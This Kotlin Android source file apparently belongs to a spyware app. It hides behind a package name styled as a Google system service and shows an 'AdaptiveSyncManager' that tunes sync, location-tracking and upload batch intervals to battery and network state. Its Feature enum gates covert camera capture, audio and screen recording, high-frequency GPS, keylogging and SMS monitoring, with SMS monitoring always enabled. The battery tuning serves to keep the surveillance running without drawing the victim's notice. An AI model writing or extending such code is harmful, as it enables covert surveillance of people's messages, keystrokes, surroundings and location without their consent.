package com.google.android.systemservice.managers

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.util.Log

/**
 * Manages adaptive synchronization intervals based on device state.
 * Adjusts sync frequency, location updates, and feature availability
 * according to battery level, charging state, network type, and power mode.
 */
class AdaptiveSyncManager(private val context: Context) {
    
    companion object {
        private const val TAG = "AdaptiveSyncManager"
        private const val PREFS_NAME = "sync_config"
    }
    
    private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
    
    /**
     * Get optimal sync interval in minutes based on current device state.
     */
    fun getSyncInterval(): Long {
        val batteryLevel = getBatteryLevel()
        val isCharging = isCharging()
        val isLowPowerMode = isLowPowerMode()
        val networkType = getNetworkType()
        
        val interval = when {
            isLowPowerMode -> 60 // 1 hour in low power mode
            isCharging && networkType == NetworkType.WIFI -> 5 // 5 min when charging + WiFi
            isCharging -> 10 // 10 min when charging
            batteryLevel < 15 -> 60 // 1 hour when critical
            batteryLevel < 30 -> 30 // 30 min when low
            networkType == NetworkType.WIFI -> 15 // 15 min on WiFi
            else -> 30 // 30 min default
        }
        
        Log.d(TAG, "Sync interval: $interval min (battery: $batteryLevel%, charging: $isCharging, network: $networkType)")
        return interval
    }
    
    /**
     * Get optimal location update interval in milliseconds.
     */
    fun getLocationUpdateInterval(): Long {
        val batteryLevel = getBatteryLevel()
        val isCharging = isCharging()
        
        val interval = when {
            isCharging -> 5 * 60 * 1000L // 5 minutes
            batteryLevel > 50 -> 10 * 60 * 1000L // 10 minutes
            batteryLevel > 20 -> 20 * 60 * 1000L // 20 minutes
            else -> 30 * 60 * 1000L // 30 minutes
        }
        
        Log.d(TAG, "Location update interval: ${interval / 1000 / 60} min")
        return interval
    }
    
    /**
     * Check if a specific feature should be enabled based on battery constraints.
     */
    fun shouldEnableFeature(feature: Feature): Boolean {
        val batteryLevel = getBatteryLevel()
        val isCharging = isCharging()
        
        val enabled = when (feature) {
            Feature.CAMERA_CAPTURE -> batteryLevel > 30 || isCharging
            Feature.AUDIO_RECORDING -> batteryLevel > 20 || isCharging
            Feature.SCREEN_RECORDING -> batteryLevel > 40 || isCharging
            Feature.HIGH_FREQUENCY_GPS -> batteryLevel > 50 || isCharging
            Feature.KEYLOGGING -> batteryLevel > 10 || isCharging
            Feature.SMS_MONITORING -> true // Always enabled
        }
        
        if (!enabled) {
            Log.d(TAG, "Feature $feature disabled due to battery constraints")
        }
        
        return enabled
    }
    
    /**
     * Get recommended batch size for data uploads.
     */
    fun getBatchSize(): Int {
        val batteryLevel = getBatteryLevel()
        val networkType = getNetworkType()
        
        return when {
            networkType == NetworkType.WIFI && batteryLevel > 50 -> 100
            networkType == NetworkType.WIFI -> 50
            batteryLevel > 50 -> 30
            batteryLevel > 20 -> 20
            else -> 10
        }
    }
    
    /**
     * Check if background operations should be throttled.
     */
    fun shouldThrottleOperations(): Boolean {
        val batteryLevel = getBatteryLevel()
        val isLowPowerMode = isLowPowerMode()
        
        return isLowPowerMode || batteryLevel < 15
    }
    
    private fun getBatteryLevel(): Int {
        return try {
            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get battery level: ${e.message}")
            100 // Assume full battery on error
        }
    }
    
    private fun isCharging(): Boolean {
        return try {
            batteryManager.isCharging
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check charging state: ${e.message}")
            false
        }
    }
    
    private fun isLowPowerMode(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.isPowerSaveMode
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check power save mode: ${e.message}")
            false
        }
    }
    
    private fun getNetworkType(): NetworkType {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return NetworkType.NONE
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return NetworkType.NONE
            
            when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> NetworkType.WIFI
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> NetworkType.CELLULAR
                else -> NetworkType.NONE
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get network type: ${e.message}")
            NetworkType.NONE
        }
    }
    
    enum class Feature {
        CAMERA_CAPTURE,
        AUDIO_RECORDING,
        SCREEN_RECORDING,
        HIGH_FREQUENCY_GPS,
        KEYLOGGING,
        SMS_MONITORING
    }
    
    enum class NetworkType {
        NONE, WIFI, CELLULAR
    }
}
